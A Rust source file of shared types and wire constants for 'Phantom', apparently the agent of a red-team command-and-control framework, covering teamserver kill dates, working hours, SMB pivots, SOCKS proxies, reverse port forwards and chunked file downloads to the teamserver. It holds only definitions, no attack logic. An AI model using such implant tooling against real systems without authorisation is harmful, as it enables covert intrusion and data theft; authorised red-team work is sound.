//! Shared Phantom command types and wire constants.

use std::collections::HashMap;
use std::net::{TcpListener, TcpStream};
use std::os::unix::net::UnixStream;

use red_cell_common::demon::DemonSocketType;

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum PendingCallback {
    Output { request_id: u32, text: String },
    Error { request_id: u32, text: String },
    Exit { request_id: u32, exit_method: u32 },
    KillDate { request_id: u32 },
    Structured { command_id: u32, request_id: u32, payload: Vec<u8> },
    MemFileAck { request_id: u32, mem_file_id: u32, success: bool },
    FsUpload { request_id: u32, file_size: u32, path: String },
    Socket { request_id: u32, payload: Vec<u8> },
    FileOpen { request_id: u32, file_id: u32, file_size: u64, file_path: String },
    FileChunk { request_id: u32, file_id: u32, data: Vec<u8> },
    FileClose { request_id: u32, file_id: u32 },
}

#[derive(Debug, Default)]
pub(crate) struct PhantomState {
    pub(crate) mem_files: HashMap<u32, MemFile>,
    pub(crate) reverse_port_forwards: HashMap<u32, ReversePortForward>,
    pub(crate) socks_proxies: HashMap<u32, SocksProxy>,
    pub(crate) sockets: HashMap<u32, ManagedSocket>,
    pub(crate) local_relays: HashMap<u32, LocalRelayConnection>,
    pub(crate) socks_clients: HashMap<u32, SocksClient>,
    pub(crate) downloads: Vec<ActiveDownload>,
    pub(crate) pending_callbacks: Vec<PendingCallback>,
    /// Active SMB pivot connections keyed by child agent DemonID.
    pub(crate) smb_pivots: HashMap<u32, PivotConnection>,
    /// Kill date set dynamically by the teamserver via `CommandKillDate` or `CommandConfig`.
    pub(crate) kill_date: Option<i64>,
    /// Working-hours bitmask set dynamically by the teamserver via `CommandConfig`.
    pub(crate) working_hours: Option<i32>,
}

/// An active pivot connection to a child agent via a Unix domain socket.
#[derive(Debug)]
pub(crate) struct PivotConnection {
    /// The Unix domain socket path used for this pivot.
    pub(crate) pipe_name: String,
    /// Non-blocking Unix domain socket connected to the child agent.
    pub(crate) stream: UnixStream,
}

#[derive(Debug)]
pub(crate) struct MemFile {
    pub(crate) expected_size: usize,
    pub(crate) data: Vec<u8>,
}

#[derive(Debug)]
pub(crate) struct ReversePortForward {
    pub(crate) listener: TcpListener,
    pub(crate) mode: ReversePortForwardMode,
    pub(crate) bind_addr: u32,
    pub(crate) bind_port: u32,
    pub(crate) forward_addr: u32,
    pub(crate) forward_port: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ReversePortForwardMode {
    Teamserver,
    Local,
}

#[derive(Debug)]
pub(crate) struct SocksProxy {
    pub(crate) listener: TcpListener,
    pub(crate) bind_addr: u32,
    pub(crate) bind_port: u32,
}

#[derive(Debug)]
pub(crate) struct ManagedSocket {
    pub(crate) stream: TcpStream,
    pub(crate) socket_type: DemonSocketType,
    pub(crate) bind_addr: u32,
    pub(crate) bind_port: u32,
    pub(crate) forward_addr: u32,
    pub(crate) forward_port: u32,
}

#[derive(Debug)]
pub(crate) struct LocalRelayConnection {
    pub(crate) left: TcpStream,
    pub(crate) right: TcpStream,
    pub(crate) parent_id: u32,
}

#[derive(Debug)]
pub(crate) struct SocksClient {
    pub(crate) stream: TcpStream,
    pub(crate) server_id: u32,
    pub(crate) state: SocksClientState,
}

#[derive(Debug)]
pub(crate) enum SocksClientState {
    Greeting { buffer: Vec<u8> },
    Request { buffer: Vec<u8> },
    Relay { target: TcpStream },
}

/// Default chunk size for file downloads (512 KiB).
pub(crate) const DOWNLOAD_CHUNK_SIZE: usize = 512 * 1024;

/// State of an active download in the agent.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum DownloadTransferState {
    Running = 1,
    Stopped = 2,
    Remove = 3,
}

/// An active file download being sent back to the teamserver in chunks.
#[derive(Debug)]
pub(crate) struct ActiveDownload {
    pub(crate) file_id: u32,
    pub(crate) request_id: u32,
    pub(crate) file: std::fs::File,
    pub(crate) total_size: u64,
    pub(crate) read_size: u64,
    pub(crate) state: DownloadTransferState,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct SocksConnectRequest {
    pub(crate) atyp: u8,
    pub(crate) address: Vec<u8>,
    pub(crate) port: u16,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum SocksRequestError {
    GeneralFailure,
    CommandNotSupported,
    AddressTypeNotSupported,
}

#[derive(Debug)]
pub(crate) struct FilesystemEntry {
    pub(crate) name: String,
    pub(crate) is_dir: bool,
    pub(crate) size: u64,
    pub(crate) modified: ModifiedTime,
}

#[derive(Debug)]
pub(crate) struct FilesystemListing {
    pub(crate) root_path: String,
    pub(crate) entries: Vec<FilesystemEntry>,
}

#[derive(Debug)]
pub(crate) struct ModifiedTime {
    pub(crate) day: u32,
    pub(crate) month: u32,
    pub(crate) year: u32,
    pub(crate) minute: u32,
    pub(crate) hour: u32,
}

#[derive(Debug)]
pub(crate) struct ProcessEntry {
    pub(crate) name: String,
    pub(crate) pid: u32,
    pub(crate) parent_pid: u32,
    pub(crate) session: u32,
    pub(crate) threads: u32,
    pub(crate) user: String,
    pub(crate) is_wow64: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct SessionEntry {
    pub(crate) client: String,
    pub(crate) user: String,
    pub(crate) active: u32,
    pub(crate) idle: u32,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ShareEntry {
    pub(crate) name: String,
    pub(crate) path: String,
    pub(crate) remark: String,
    pub(crate) access: u32,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct GroupEntry {
    pub(crate) name: String,
    pub(crate) description: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct UserEntry {
    pub(crate) name: String,
    pub(crate) is_admin: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct MemoryRegion {
    pub(crate) base: u64,
    pub(crate) size: u32,
    pub(crate) protect: u32,
    pub(crate) state: u32,
    pub(crate) mem_type: u32,
}

pub(crate) const PAGE_NOACCESS: u32 = 0x01;
pub(crate) const PAGE_READONLY: u32 = 0x02;
pub(crate) const PAGE_READWRITE: u32 = 0x04;
pub(crate) const PAGE_WRITECOPY: u32 = 0x08;
pub(crate) const PAGE_EXECUTE: u32 = 0x10;
pub(crate) const PAGE_EXECUTE_READ: u32 = 0x20;
pub(crate) const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub(crate) const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
pub(crate) const MEM_COMMIT: u32 = 0x1000;
pub(crate) const MEM_PRIVATE: u32 = 0x20_000;
pub(crate) const MEM_MAPPED: u32 = 0x40_000;
pub(crate) const MEM_IMAGE: u32 = 0x100_0000;
pub(crate) const SOCKS_VERSION: u8 = 5;
pub(crate) const SOCKS_METHOD_NO_AUTH: u8 = 0;
pub(crate) const SOCKS_METHOD_NOT_ACCEPTABLE: u8 = 0xFF;
pub(crate) const SOCKS_COMMAND_CONNECT: u8 = 1;
pub(crate) const SOCKS_REPLY_SUCCEEDED: u8 = 0;
pub(crate) const SOCKS_REPLY_GENERAL_FAILURE: u8 = 1;
pub(crate) const SOCKS_REPLY_COMMAND_NOT_SUPPORTED: u8 = 7;
pub(crate) const SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED: u8 = 8;

/// Maximum number of framed messages to read per pivot per poll cycle.
pub(crate) const MAX_PIVOT_READS_PER_POLL: usize = 30;
/// Maximum allowed pivot frame size (30 MiB, matches `DEMON_MAX_RESPONSE_LENGTH`).
pub(crate) const PIVOT_MAX_FRAME_SIZE: usize = 0x1E0_0000;
